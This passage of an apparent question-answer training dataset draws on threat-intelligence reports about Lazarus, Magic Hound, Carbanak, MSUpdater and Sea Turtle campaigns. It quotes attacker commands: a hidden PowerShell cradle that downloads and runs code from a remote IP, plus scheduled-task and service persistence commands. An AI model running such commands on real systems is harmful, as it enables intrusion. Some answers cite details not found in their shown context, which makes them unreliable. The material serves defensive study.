CPL file called wpm.cpl\n(942489ce7dce87f7888322a0e56b5e3c3b0130e11f57b3879fbefc48351a78f6) is executed.\nCSIDL_COMMON_APPDATA\\finaldata\\wpm.cpl Thumbs.ini 4 30\nThis file contains, and connects to, a list of IP addresses and records whether the connections were successful.\n01:11 \u2013 Again, the final.cpl shellcode loader is executed multiple times, executing some unknown shellcode. This activity continued intermittently until 23:49.\n23:49 \u2013 The file name of the CPL file changes to 'ntuser.dat'. The file location and command-line arguments remain the same.\nMedium Headline: January 19\n00:24 \u2013 The CPL shellcode loader files (final.cpl and ntuser.dat) are executed multiple times.\n00:28 \u2013 The attackers create a scheduled task on another machine, likely to ensure persistence:\nschtasks /create /RU [REDACTED]\\i21076 /ST 09:28 /TR \"cmd.exe /c C:\\ProgramData\\Adobe\\arm.bat\" /tn arm /sc MINUTE\nThe command is used to schedule a task named 'arm' to run the file 'arm.bat' starting at at 09:28 then every minute after that under the user account '[REDACTED]\\i21076'.\n00:29 \u2013 A file named arm.dat (48f3ead8477f3ef16da6b74dadc89661a231c82b96f3574c6b7ceb9c03468291) is executed with the following command line arguments:\nCSIDL_SYSTEM\\rundll32.exe\nCSIDL_COMMON_APPDATA\\adobe\\arm.dat,packageautoupdater\nLimitedSpatialExtent_U_f48182 -d 1440 -i 10 -q 8 -s 5\nThe arm.dat file is a tool used to take screenshots of web pages viewed on the compromised machine every 10 seconds (SiteShoter), as determined by the command line arguments. The screenshots are saved in appdata\\local with the date at the top of the file.\n06:50 \u2013 The shellcode loader (final.cpl) is executed several times.\n07:34 \u2013 A new CPL file named addins.cpl (5f20cc6a6a82b940670a0f89eda5d68f091073091394c362bfcaf52145b058db) is executed multiple times, which again is another shellcode loader and has the same command line arguments as seen with final.cpl:\nCSIDL_SYSTEM\\rundll32.exe CSIDL_COMMON_APPDATA\\addins.cpl, AppMgmt EO6-CRY-LS2-TRK3\n07: 39 \u2013 A scheduled task is created:\nsc create uso start= auto binPath= \"cmd.exe /c start /b C:\\Programdata\\addins.bat\" DisplayName= uso\nThe task is used to auto-start and execute addins.bat each time the system is booted. The task uses the service name 'uso' (a file name previously used in older Dream Job campaigns targeting security researchers).\nThe attacker runs addins.cpl again to run a command to start the service and then delete the service directly after:\nCSIDL_SYSTEM\\rundll32.exe CSIDL_COMMON_APPDATA\\addins.cpl, AppMgmt EO6-CRY-LS2-TRK3\nsc start uso (via cmd.exe)\nsc delete uso\nThe following commands were then executed to collect information pertaining to network configuration, current user the attackers are logged in as, active users on the machine, available shared drives, and the contents of the 'addins' directory.\nipconfig /all\nwhoami\nquery user\nnet use\ndir CSIDL_WINDOWS\\addins\n07:41 \u2013 The file addins.cpl is executed again multiple times before a scheduled task is created to run addins.bat again, start the service, and immediately delete the service:\nsc create uso start= auto binPath= \"cmd.exe /c start /b C:\\Windows\\addins\\addins.bat\" DisplayName= uso\nsc start uso\nsc delete uso\nMedium Headline: January 20\nThe attackers execute addins.cpl again with the same command line as before.\nNo further activity is observed.\nThe Lazarus group is likely targeting organizations in the chemical sector to obtain intellectual property to further North Korea's own pursuits in this area. The group's continuation of Operation Dream Job, as witnessed by Symantec , suggests that the operation is sufficiently successful. As such, organizations should ensure they have adequate security in place and remain vigilant for attacks such as this.\nAs always, users should be wary of clicking links or downloading files even if they come from seemingly trustworthy sources.\n\nQuestion: How does the Lazarus group achieve initial access and persistence in the attack described? Explain the process from the reception of the malicious HTM file to the creation of scheduled tasks.\n\nAnswer:",
    "output": "The Lazarus group achieves initial access through a malicious HTM file, likely received via email or downloaded from the web. This HTM file is copied to a DLL file called scskapplink.dll and injected into the legitimate system management software INISAFE Web EX Client. The scskapplink.dll file is a signed Trojanized version of the ComparePlus plugin for Notepad++ with malicious exports added. It then downloads and executes a backdoor payload (final.cpl) from a command-and-control (C&C) server. This file is a Trojanized version of the Tukaani project LZMA Utils library (XZ Utils) with a malicious export added. The malware connects to a remote location to download, decode, and execute shellcode. Over several hours, the attackers run unknown shellcode via final.cpl at various intervals, likely to collect dumped system hives, among other things. To ensure persistence, the attackers create a scheduled task to execute 'Intel.bat' as a specific user starting at a certain time and then every minute.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Initial Discoveries\nThe following new samples were likely delivered via similar spear phishing campaigns as described in IBM's research. All three shared the same IPs and URLs, also provided below. These samples were located by pivoting on document attributes. In this case, a sample from the IBM report indicated the document author 'gerry.knight' which led us to the following three additional samples. MD5\nMD5\n2a0df97277ddb361cecf8726df6d78ac\n5e5ea1a67c2538dbc01df28e4ea87472\nd30b8468d16b631cafe458fd94cc3196\nIPs\n104.218.120[.]128\n69.87.223[.]26\n5.254.100[.]200\nURLs\nanalytics-google[.]org:69/checkFile.aspx analytics-google[.]org\n69.87.223[.]26:8080/p\nThe following is a screenshot of a macro-enabled document captured from sample 5e5ea1a67c2538dbc01df28e4ea87472:\nOnce enabled the extracted macro executed the following:\n'powershell.exe -w hidden -noni -nop -c \"iex(New-Object\nSystem.Net.WebClient).DownloadString(\\'http://69.87.223.26:8080/p\\')\"'\nBig Headline: Pivoting on Passive DNS\nFrom the previous samples, we performed a passive DNS lookup on the IPs. We found get.adobe.go-microstf[.]com hosted at 104.218.120[.]128 around the time this campaign was ongoing, November 2016.\nResearching the domain go-microstf[.]com, hosted at 45.63.10[.]99, revealed yet another iteration of malicious executables. In this case, a URL used to download the PowerShell component shared a naming convention found in the IBM report, http://69.87.223[.]26:8080/eiloShaegae1 and connected to the IP address used by the previous three samples. The following are IOCs related to this domain:\nMD5\n83be35956e5d409306a81e88a1dc89fd\nIPs\n45.63.10[.]99\n69.87.223[.]26\nURLs\ngo-microstf[.]com\n69.87.223[.]26:8080/eiloShaegae1 go-microstf[.]com/checkfile.aspx\nThe domain go-microstf[.]com was originally set up to spoof Google Analytics login page. The following screenshot is from the malicious domain:\nBig Headline: Possible Connections to Iranian state-sponsored Kittens\nFinally, research yielded a relatively unique sample. This particular iteration was submitted to VirusTotal on September 16, 2016. The majority of samples analyzed to date were submitted no earlier than mid-October, with most being submitted in January 2017 or later. We were able to discover this particular version by diving further into connections to analytics-google[.]org. Unlike newer samples, this one created a unique file 'sloo.exe'. The file was created at C:\\Documents and Settings\\Admin\\Local Settings\\Temp\\sloo.exe. In addition to this file, the sample also contacted 104.238.184[.]252 for the PowerShell executable.\nResearchers at (<http://researchcenter.paloaltonetworks.com/2017/02/unit42-magic-hound-campaign-attacks-saudi-targets/>)Palo Alto have attributed sloo.exe and related activities to threat actors of a likely Iranian state-sponsored origin which they've named Magic Hound. The group Magic Hound is linked via infrastructure and tools to the Rocket Kitten threat actor group although Palo Alto cannot confirm the extent of any relationship between the two groups.\nDell Secureworks analysts recently (<https://www.secureworks.com/blog/iranian-pupyrat-bites-middle-eastern-organizations>)concluded that domains discussed in the IBM report were linked to the Iranian PuppyRAT. In addition, Dell analysts have assessed with high-confidence these activities are attributable to Iranian state-sponsored activities.\nIOCs for this version were:\nMD5\n07d6406036d6e06dc8019e3ade6ee7de\nIPs\n104.238.184[.]252\n5.254.100[.]200\nURLs\nanalytics-google[.]org:69/checkFile.aspx\nRead the text above and answer this question: What steps did the researchers take to uncover further malicious domains and executables related to the Shamoon2 campaign, and what specific techniques were used to link these findings to the original campaign?",
    "output": "The researchers performed a passive DNS lookup on the IPs associated with the initial samples. This led them to discover the domain get.adobe.go-microstf[.]com hosted at 104.218.120[.]128 around the time the campaign was ongoing, in November 2016. Further research on the domain go-microstf[.]com, hosted at 45.63.10[.]99, revealed another iteration of malicious executables. The URL used to download the PowerShell component shared a naming convention found in the IBM report and connected to the IP address used by the previous three samples. This methodology allowed the researchers to link these findings to the original Shamoon2 campaign.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does Threat Group-3390 (TG-3390) use exfiltration techniques to steal sensitive data from its targets?",
    "output": "Exfiltration is the process of stealing data from a network without being detected. In the case of Threat Group-3390 (TG-3390), exfiltration plays a crucial role in achieving their goals. According to the analysis of TG-3390's operations, the threat actors are adept at identifying key data stores and selectively exfiltrating high-value information associated with their objectives. They use various techniques to exfiltrate data, including compressing and encrypting it to avoid detection. Specifically, TG-3390 actors have been observed using the PlugX remote access tool to exfiltrate data, as well as staging RAR archives on externally accessible web servers and issuing HTTP GET requests to retrieve the archive parts. Furthermore, the threat actors have been known to use encryption and split the RAR archives into parts to evade detection. For instance, in one intrusion, approximately 300 GB of data was exfiltrated over a month-long period. Overall, TG-3390's exfiltration techniques demonstrate their sophistication and ability to adapt to evade detection.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Carbanak\nThe Carbanak group is a criminal advanced persistent threat group whose attacks against dozens (potentially hundreds) of global financial institutions resulted in an estimated $1 billion in losses in the first half of 2014. Depending on the victim, the attacks are believed to have begun between December 2013 and June 2014. According to Kaspersky Labs, each victim bank lost $2.5 million to $10 million to the campaign. The victim financial institutions were located in Russia, the United States, Germany, China and Ukraine; additionally, the group may also have begun targeting organizations in Malaysia, Nepal, and Kuwait. The vast majority of victims (at least 52) are located in Russia. Overall, the group targeted at least 100 financial organizations at 300 IP addresses located in approximately 30 countries. Of the ~100 organizations targeted, Kaspersky believes that at least half suffered financial loss.\nThe Carbanak group is particularly significant because it demonstrates how the dangerous escalation of sophisticated cyber exploit kits, perpetuated by state sponsored groups and government agencies, has guided the development of complex and demonstratively effective criminal platforms that can financially harm private organizations and individuals alike. Consider that the Carbanak group stole an estimated $1 billion in less than 6 months. The loss to the global financial institutions, though meager compared to the entire global economy, can still lead to cascading global economic impacts within and outside the victim organizations.\nLike most APT groups, Carbanak attacks began with a spear phishing campaign. The malicious emails appeared as legitimate banking communique accompanied by attached Microsoft Word (97-2003) documents and Control Panel Applet (.CPL) files. The attachments infected victim systems with malware and with a backdoor based on the Carberp malware. It is also possible that some of the emails contained urls that redirected the victim to a landing page that delivered the malware in the background before forwarding the user to a familiar financial site. Analyzed malicious attachments reveal that the attackers exploited vulnerabilities in Microsoft Word 2003, 2007, and 2010 (CVE-2012-0158, and CVE-2014-1761). After successful exploitation of a vulnerability, the shellcode decrypts and the Carbanak backdoor is installed on the victim host. The Carbanak backdoor installs and then it re-installs itself into \"%system32%\\com\" as a copy of \"svhost.exe\" with the system, hidden, and read-only attributes. The initial version (delivered by the exploit) is then deleted. After installation, the backdoor connects to its C2 server through HTTP (with RC2+Base64 encryption) and downloads a file (kldconfig.plug) which details which process to monitor. The kit sets the Termservice service execution mode to auto to enable Remote Desktop Protocol (RDP). The backdoor provided access to the intranet of the victim organization. Next, the adversary probed the intranet for other vulnerable targets and specifically for critical financial systems. Typically, tens to hundreds of computers were infected before an admin system, with the necessary access, was compromised. If banking applications such as BLIZKO or IFOBS are discovered, then a special notification is sent to the C2 server to notify the adversary that financial systems were discovered.\nOnce the attackers discovered financial systems on the victim network, they deployed keyloggers, tools to hijack video capture, and screen capture tools to learn as much information as possible about the environment. The Carbanak tool kit typically logs keystrokes and takes screenshots every 20 seconds. The monitoring occurs by intercepting the ResumeThread call. The captured videos are recorded at low bandwidth and are used to help the attackers develop an operational picture of typical workflow, tool usage, and practices. In addition to training the adversary to transfer money, the monitoring also reduces the likelihood that the adversary will set off behavioral analytic systems. The remote administration tool, Ammyy Admin, might also\nbe installed on victim systems to ease remote access (the tool is whitelisted by legitimate system administrators in some corporate environments).\nAttackers studied the financial tools and applications installed on the victim hosts in order to maximize the potential gain from the compromised system. Rather than searching for exploits and flaws in the security and financial applications, the adversary meticulously recorded the activity of administrators in order to learn the necessary information and procedures to transfer money.  Files on captured C2 servers indicate that the adversary may also exfiltrate classified emails, manuals, cryptographic keys, and other information. When the adversary knew the necessary information and knew how to use the most powerful host applications, they would withdraw or transfer significant sums. The method of withdraw or transfer depended on the system, situation, and available resources (time, people, etc.). Observed methods of stealing cash include fraudulent online banking transfers, electronic cash transfers to banks in China and the United States, SWIFT transfers to compromised bank accounts, and remote commands to ATMs to spew cash onto the street at a specific date and time. In the instances where physical interaction with an ATM or bank personnel was necessary, the group would pay individuals to act as \"mules\" in the cash transfer.\nThe command and control infrastructure rotates every few weeks. It consists of Linux servers to issue commands, Windows servers used for remote connections, backup servers, and drop servers containing executables and additional components. Victim systems are catalogued in server logs according to the adversary's categorization.\n\nHow did the Carbanak group initiate their attacks against financial institutions, and what specific vulnerabilities did they exploit in Microsoft Word?",
    "output": "The Carbanak group initiated their attacks using a spear phishing campaign. They sent malicious emails that appeared as legitimate banking communications, accompanied by attached Microsoft Word (97-2003) documents and Control Panel Applet (.CPL) files. Some emails may have contained URLs redirecting victims to landing pages that delivered malware. The attackers exploited vulnerabilities in Microsoft Word 2003, 2007, and 2010, specifically CVE-2012-0158 and CVE-2014-1761. After successful exploitation, the shellcode decrypted and installed the Carbanak backdoor on the victim host.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: September\t\n \u00a02010 CVE-\u00ad\u20102010-\u00ad\u201028837 PDF Phish\nSeptember 16, 2010\t\n  the\t\n  blog Contagio detailed a\t\n  malicious phishing campaign exploiting a\t\n  buffer overflow vulnerability in\t\n  the Adobe PDF reader8 .\t\n \u00a0At the time, this was a 0-\u00ad\u2010day exploit, as a\t\n \u00a0patch was not released by Adobe until October\t\n \u00a05, 2010. The exploit\t\n \u00a0was contained in the attachment:\n\u2022 INTEREST_&_FOREIGN_EXCHANGE_RATES.pdf\no MD5: 4EF704239FA63D1C1DFCF2EA2DA0D7119\nThis PDF\t\n  dropped a\t\n  similar set of files:\n\u2022 setup.exe:\no MD5: 95D42D365489A6E5EBDF62565C5C8AA2\no Sophos uniquely detects10 as Mal/Ovoxual-\u00ad\u2010A\t\n \u00a0(detection\t\n \u00a0added\t\n \u00a007/19/2010)11\no Which creates FAVORITES.DAT (data file) and launches msupdater.exe12\n\u2022 msupdater.exe:\no MD5: 374075CE8B6E8F0CD1F90009FD5A703B\no Sophos uniquely detects13 as Mal/ \t\n \u00a0Ovoxual-\u00ad\u2010B\t\n \u00a0(added\t\n \u00a007/19/2010)14\no Sandbox reports for this sample\t\n  generally fail15 showing the following dialog box:\nSystem runtime\t\n  analysis showed an initial malformed Google query:\n\u2022 www.google.com/search?qu=\n6 http://vms.drweb.com/virus/?i=225137\n7 http://www.adobe.com/support/security/advisories/apsa10-\u00ad\u201002.html\n8 http://contagiodump.blogspot.com/2010/09/sep-\u00ad\u201016-\u00ad\u2010cve-\u00ad\u20102010-\u00ad\u20102883-\u00ad\u2010pdf-\u00ad\u2010interest.html\n9 https://www.virustotal.com/file/daac83fc4af5c53068c4e5a29dadfdc5200e3b3fc2b491eebe0a4bc19ec9e3f2/analysis/1285731514/\n10 https://www.virustotal.com/file/ecefcd2f2b862e987ea4b6b7d475c924d9662ad955096872a2c5b822901c63b3/analysis/\n11 http://www.sophos.com/en-\u00ad\u2010us/threat-\u00ad\u2010center/threat-\u00ad\u2010analyses/viruses-\u00ad\u2010and-\u00ad\u2010spyware/Mal~Ovoxual-\u00ad\u2010A/detailed-\u00ad\u2010analysis.aspx\n12 http://anubis.iseclab.org/?action=result&task_id=14495366b24a64d242d1946aa1e3a88be&format=html\nFollowed by failed connection attempts to:\n\u2022 140.112.19.195\t\n  (National Taiwan University)\nA\t\n  further detailed\t\n  static analysis on\t\n  this msupdate.exe / FAVORITES.DAT sample was completed\t\n  by CyberESI16.\t\n  In their report they discuss that the setup.exe dropper is virtual\t\n  machine (VM) aware by using the SIDT instruction17 \u2013 if \t\n \u00a0a \t\n \u00a0VM \t\n \u00a0is \t\n \u00a0detected, the msupdate.exe Trojan\t\n \u00a0is not dropped. The msupdate.exe Trojan too is \t\n \u00a0VM \t\n \u00a0aware \t\n \u00a0using \t\n \u00a0the \t\n \u00a0same SIDT\t\n \u00a0method \u2013 if \t\n \u00a0a \t\n \u00a0VM is \t\n \u00a0not \t\n \u00a0detected then the Trojan RC4\t\n \u00a0decrypts the FAVORITES.DAT\t\n \u00a0file and spawns a\t\n \u00a0svchost.exe process which conducts the network C&C\t\n \u00a0check-\u00ad\u2010ins.\t\n \u00a0\t\n \u00a0This \t\n \u00a0evasion \t\n \u00a0is \t\n \u00a0the \t\n \u00a0reason \t\n \u00a0for \t\n \u00a0the \t\n \u00a0above \t\n \u00a0shown \t\n \u00a0failed \t\n \u00a0sandboxing \t\n \u00a0analysis \t\n \u00a0that does not include any network activity.\nThe decrypted FAVORITES.DAT\t\n  executable for this sample had an MD5 hash\t\n  of:\n13 www.virustotal.com/file-\u00ad\u2010scan/report.html?id=043935374ce39637a4816d0a484d30bed1d3054bbe89625fbc22f83ef4cb3e04-\u00ad\u20101285736283\n14 http://www.sophos.com/en-\u00ad\u2010us/threat-\u00ad\u2010center/threat-\u00ad\u2010analyses/viruses-\u00ad\u2010and-\u00ad\u2010spyware/Mal~Ovoxual-\u00ad\u2010B/detailed-\u00ad\u2010analysis.aspx\n15 http://www.threatexpert.com/report.aspx?md5=374075ce8b6e8f0cd1f90009fd5a703b\n17 http://www.securiteam.com/securityreviews/6Z00H20BQS.html\n16 http://www.cyberesi.com/2011/03/17/msupdate-\u00ad\u2010exe-\u00ad\u2010favorites-\u00ad\u2010dat-\u00ad\u2010analysis/\n\u2022 5E3EACA3806769836C3AD9D46A20964418\no Microsoft and a few other A/V vendors detect as Backdoor Matchaldru.B\no DrWeb uses their same \"Calla\" family: \"Backdoor.Calla.16\"\no The VirusTotal timeframe for submissions of this decrypted executable are from: 03/15/2011\t\n  \u2013 04/20/2011.\nHere is the Google \"decoy\t\n  beacon\" made by\t\n  the Trojan:\nFollowed by the\t\n \u00a0initial C&C check-\u00ad\u2010in \t\n \u00a0request:\nThe check-\u00ad\u2010in request\t\n \u00a0values correspond to the following meanings:\n\u2022 The h1\t\n  parameter value corresponds to\t\n  the Windows version, 51 = Windows XP (version\t\n  5.1)\n\u2022 The h4\t\n  parameter value is a\t\n  victim identification string\t\n  created by encoding\t\n  the\t\n  volume\t\n  serial number of the victim's\t\n  system concatenated with a random number\n\u2022 The string within \t\n \u00a0the \t\n \u00a0user-\u00ad\u2010agent (BKANAHEAFPEM) is the\t\n \u00a0result of an encoding of the\t\n \u00a0victim machine name\n\u2022 The number following \"search5\" in the path is random\n\u2022 The remaining are hard-\u00ad\u2010coded in the Trojan. The \"BHI06233\" string is\t\n \u00a0thought to be related to the actor's group of\t\n \u00a0related targets or\t\n \u00a0campaign, where BHI may stand for\t\n \u00a0\"Baker\t\n \u00a0Hughes\nInternational\" \t\n  who \t\n  along \t\n  with \t\n  other \t\n  companies \t\n  in \t\n  the \t\n  oil, \t\n  gas, \t\n  and \t\n  energy \t\n  sector \t\n  were \t\n  the focus of\t\n  some targeted attacks.19\n18 https://www.virustotal.com/file/d8a976979d4eeaf7485249c49d4a31824638a49dac308c5114c113b4a3eed9c9/analysis/1300216834/\nThe data\t\n \u00a0in the check-\u00ad\u2010in \t\n \u00a0HTTP \t\n \u00a0communication \t\n \u00a0to \t\n \u00a0and \t\n \u00a0from \t\n \u00a0the \t\n \u00a0C&C are\t\n \u00a0encoded using single-\u00ad\u2010byte XORing and\t\n \u00a0is treated\t\n \u00a0as authentication\t\n \u00a0into\t\n \u00a0the botnet. Once authenticated, the victim uses the following check-\u00ad\u2010in \t\n \u00a0beacons:\n\u2022 HTTP GET: /search6[RndNum]?h1=[VictimId]\no Where VictimId is the same string identifying the victim machine\t\n  as the\t\n  previously used h4 parameter value.\n\u2022 User-\u00ad\u2010Agent: Mozilla/5.0 (compatible; Windows NT 5.2)\no Note that the user-\u00ad\u2010agent changed to a\t\n \u00a0hard-\u00ad\u2010coded string versus\t\n \u00a0using the encoded system name in the initial check-\u00ad\u2010in.\nSome\t\n  of the\t\n  Trojan functionality includes:\n\u2022 Download file from C&C:\no HTTP GET: /download7[RndNum]?h1=[VictimId]\n\u2022 Upload file to C&C:\no HTTP POST: /upload8[RndNum]?h1=[VictimId]\n\u2022 Command\t\n  execution\t\n  response to\t\n  C&C:\no HTTP POST: /search2[RndNum]?h1=[VictimId]\nThere are over a\t\n  dozen other commands identified in the Trojan listed in the CyberESI report.\nBig Headline: September\t\n  23, 2010 ISSNIP Phishing Email with Malicious Attachment\nA few days later following the previously detailed incident,\t\n  another incident with information publicly available was reported in which a phishing email was sent\t\n  from a Yahoo account\t\n  to a defense contractor\t\n  with content\t\n  about\t\n  a conference and malicious\t\n  attachment, \"ISSNIP_2010.pdf\" (MD5 hash: 3D966CD90D320EA4A319452D1CCB11AA):\nFrom the\t\n  analysis, the\t\n  malicious attachment appeared to have\t\n  the\t\n  same\t\n  functionality as listed in the\t\n  previous incident \u2013 to include the unique\t\n  dropped files \"msupdater.exe\" and \"FAVORITES.DAT\".\n19 http://www.bloomberg.com/news/2011-\u00ad\u201002-\u00ad\u201024/exxon-\u00ad\u2010shell-\u00ad\u2010bp-\u00ad\u2010said-\u00ad\u2010to-\u00ad\u2010have-\u00ad\u2010been-\u00ad\u2010hacked-\u00ad\u2010through-\u00ad\u2010chinese-\u00ad\u2010internet-\u00ad\u2010servers.html\n\nAnswer this question based on the above context: How did the MSUpdater Trojan evade detection in sandbox environments, and what specific techniques were used to achieve this?",
    "output": "The MSUpdater Trojan evaded detection in sandbox environments through VM awareness. Specifically, the setup.exe dropper and the msupdate.exe Trojan both used the SIDT instruction to detect if they were running in a virtual machine. If a VM was detected, the msupdate.exe Trojan was not dropped. This evasion technique prevented the Trojan from being analyzed in typical sandbox environments, resulting in failed sandboxing analyses that did not show any network activity.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Medium Headline: Loader\nThis component is a Themida-protected file. We estimate the version of Themida to be 2.0-2.5, which agrees with KrCERT's report (page 20). The Loader serves as a simple injector that is looking for its injection parameters in the resources: the name of the encrypted file and the decryption key, which is the string \"542\". The instance delivered by the dropper looks for the file bcyp655.tlb (the Downloader). It creates a mutex Global\\RRfreshRA_Mutex_Object. The choice of the targeted service and the injection method are the same as in the dropper.\nLet us talk for a while about the encryption method used by the dropper and by this loader. The common key is the string \"542\", which is initially provided as a command-line parameter to the Dropper and subsequently as a 3-byte encrypted resource for the Loader. To expand a short master key to a larger expanded key (so-called key scheduling), the MD5 hash of the string is computed, which is 7DCD340D84F762EBA80AA538B0C527F7. Then it takes first three double words, let's\ndenote them A := 0x7DCD340D, B := 0x84f762EB, C:= 0xA80aa538. The length of an encrypted buffer is divided by 3, and this is the number of iterations that transforms the initial sequence (A,B,C) into the proper key. In every iteration (X,Y,Z) becomes (X^Y, Y^Z, X^Y^Z). Because the XOR operation (denoted ^) is commutative and transitive, and its square is zero, which leaves everything unchanged, we can compute that after 8 iterations we get the identity, so the key could reach just 7 pairwise different states and is equal to the first 12 characters of the MD5 hash of \"542\" if the length is a multiple of 24.\nWhat is interesting is how the remainder of the length division by 3 is treated. If the number of iterations was increased by this remainder, then we would reach just another of the 7 states of the key. However, the twist is in the change of operation: ^ is replaced with the OR operation in the code for the remainder. For example, the key with the remainder 1 becomes {FE F7 3A F9 F7 D7 FF FD FF F7 FF FD} for one of the states (of (C, A^B, B^C) to be precise), so we get new possible transformations of the key that tend to be more likely to be ones than zeroes.\nThat was the part preparing the key. The encryption algorithm itself looks like  at first glance. It was a secret technology developed in 1987 and used in over-the-air communication privacy in the GSM cellular telephone standard until reverse-engineered in 1999. The crucial part of the algorithm is three linear feedback shift registers (LFSRs). However, only the lengths of LFSRs in the malware code coincide with the official implementation, not the constants.\nTable 2. Comparison of crypto algorithms between malware and the official implementation\nThe decryption loop in each iteration basically derives a 1-byte XOR key for the corresponding byte of the encrypted buffer. The purpose of LFSRs is that they could transform the key, so the whole process is much more complicated. But due to the mentioned change of the operation, LFSRs would not affect it and the 1-byte XOR key remains the same for all iterations.\nMedium Headline: Downloader, aka WinHttpClient\nThe main downloader is dropped by the Dropper component under the bcyp655.tlb name and injected into one of the services by the Loader. Its main purpose is to deliver additional stages onto the victim's computers. The network protocol is based on HTTP but requires several stages to establish a trusted connection.\nThe malware fingerprints the victim's system: see Figure 9.\nThe first step is authorization. After sending randomly generated, generic parameters code and id, the expected response starts with <!DOCTYPE HTML PUBLIC Authentication En> followed by additional data delimited by a semicolon. However, in the next POST request the parameters are already based on the victim's IP. Because we didn't know which victims were targeted, during our investigation, we always received a \"Not Found\" reply, not the successful \"OK\".\nIf the victim passes these introductory messages and the connection is acknowledged, then the decrypted response starts with an interesting artifact: a keyword ohayogonbangwa!!. As a whole, we haven't found that word on the internet, but the closest meaning could be \"Ohayo, Konbangwa\" (\u304a\u306f\u3088\u3046\u3053\u3093\u3070\u3093\u3050\u3041), which is \"Good morning, good evening\" in Japanese. From this point, there are more messages that are exchanged, with the final exchange asking for an executable to load into memory.\nBig Headline: Conclusion\nAttackers are constantly trying to find new ways to deliver malware to target computers. Attackers are particularly interested in supply-chain attacks, because they allow them to covertly deploy malware on many computers at the same time. In recent years ESET researchers analyzed such cases as , (<https://www.welivesecurity.com/2017/10/20/osx-proton-supply-chain-attack-elmedia/>)Elmedia Player, , , and the (<https://www.welivesecurity.com/2019/03/11/gaming-industry-scope-attackers-asia/>)gaming industry. We can safely predict that the number of supply-chain attacks will increase in the future, especially against companies whose services are popular in specific regions or in specific industry verticals.\nThis time we analyzed how the Lazarus group used a very interesting approach to target South Korean users of WIZVERA VeraPort software. As mentioned in our analysis, it's the combination of compromised websites with WIZVERA VeraPort support and specific VeraPort configuration options that allow attackers to perform this attack. Owners of such websites could decrease the possibility of such attacks, even if their sites are compromised, by enabling specific options (e.g. by specifying hashes of binaries in the VeraPort configuration).\nSpecial thanks to D\u00e1vid G\u00e1bri\u0161 and Peter Ko\u0161in\u00e1r.\nFor any inquiries, or to make sample submissions related to the subject, contact us at threatintel@eset.com\nBig Headline: References\nKrCERT/CC, \"(<https://www.boho.or.kr/filedownload.do?attach_file_seq=2452&attach_file_id=EpF2452.pdf>)Operation BookCodes TTPs#1 Controlling local network through vulnerable websites\", English Translation, 1st April 2020\nKrCERT/CC, \"(<https://www.boho.or.kr/filedownload.do?attach_file_seq=2455&attach_file_id=EpF2455.pdf>)Operation BookCodes TTPs#2 \uc2a4\ud53c\uc5b4 \ud53c\uc2f1\uc73c\ub85c \uc815\ubcf4\ub97c \uc218\uc9d1\ud558\ub294 \uacf5\uaca9\ub9dd \uad6c\uc131 \ubc29\uc2dd \ubd84\uc11d\", Korean, 29th  June 2020\nP. K\u00e1lnai, M. Poslu\u0161n\u00fd: \"\", Virus Bulletin 2018 (Montreal)\nP. K\u00e1lnai: \"\", WeLiveSecurity, February 2017\nP. K\u00e1lnai, A. Cherepanov \"\", WeLiveSecurity, April 2018\nD. Breitenbacher, K. Osis: \"(<https://web-assets.esetstatic.com/wls/2020/06/ESET_Operation_Interception.pdf>)Operation In(ter)ception: Aerospace and military companies in the crosshairs of cyberspies\", June 2020\nNovetta et al, \"\", February 2016,\nMarcus Hutchins, \"\",  May 2015\nKaspersky GReAT: \"\", July 2020\nA. Kasza: \"\", Palo Alto Networks, August 2017\nUS-CERT CISA,\nWeLiveSecurity: \"\", December 2014\nR. Sherstobitoff, I. Liba. J. Walter: \"(<https://www.mcafee.com/enterprise/en-us/assets/white-papers/wp-dissecting-operation-troy.pdf>)Dissecting Operation Troy: Cyberespionage in South Korea\", McAfee\u00ae Labs, May 2018 McAfee Labs: \"(<https://www.mcafee.com/https://web-assets.esetstatic.com/wls/2011/07/McAfee-Labs-10-Days-of-Rain-July-2011.pdf>)Ten Days of Rain\", July 2011\nFireye/Mandiant: \"(<https://www.fireeye.com/blog/threat-research/2017/09/north-korea-interested-in-bitcoin.html>)Why Is North Korea So Interested in Bitcoin?\", September 2017 Choe Sang-Hun: \"(<https://www.nytimes.com/2013/03/21/world/asia/south-korea-computer-network-crashes.html>)Computer Networks in South Korea Are Paralyzed in Cyberattacks\", March 2013 A5/1 stream cipher, (<https://en.wikipedia.org/wiki/A5/1>)Wikipedia\n\nQuestion: How does the Loader component of the Lazarus group's toolset utilize Themida protection and what role does it play in the overall infection chain?\n\nAnswer:",
    "output": "The Loader component is protected using Themida, estimated to be version 2.0-2.5. It acts as a simple injector that searches for its injection parameters within the resources, specifically the name of the encrypted file and the decryption key, which is the string '542'. The Loader delivered by the dropper looks for the file bcyp655.tlb (the Downloader) and creates a mutex named Global\\\\RRfreshRA_Mutex_Object. The targeted service and the injection method are consistent with those used by the dropper.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: New DNS hijacking technique\nTalos now has moderate confidence that the threat actors behind Sea Turtle have been using another DNS hijacking technique. This new technique has been used very sparingly, and thus far have only identified two entities that were targeted in 2018, though we believe there are likely more.\nThis new technique once again involved modifying the target domain's name server records to point legitimate users to the actor-controlled server. In this case, the actor-controlled name server and the hijacked hostnames would both resolve to the same IP address for a short period of time, typically less than 24 hours. In both observed cases, one of the hijacked hostnames would reference an email service and the threat actors would presumably harvest user credentials. One aspect of this technique that makes it extremely difficult to track is that the actor-controlled name servers were not used across multiple targets \u2014 meaning that every entity hijacked with this technique had its own dedicated name server hostname and its own dedicated IP address. Whereas previously reported name server domains such as ns1[.]intersecdns[.]com were used to target multiple organizations.\nIn one case, a private organization primarily used a third-party service as their authoritative name server. Then, for a three-hour window in January 2018, their name server records were changed to a name server hostname that mimicked a slightly different version of the organization's name. During that three-hour window, the actor-controlled IP address hosted three hostnames, the two actor-controlled name servers and the webmail hostname. This would allow the threat actors to perform a man-in-the-middle (MitM) attack, as outlined in our previous post, and harvest credentials. This technique was also observed against a government organizations in the Middle East and North African region.\nBig Headline: Continued activity against ccTLD\nThe Institute of Computer Science of the Foundation for Research and Technology - Hellas (ICS-Forth), the ccTLD for 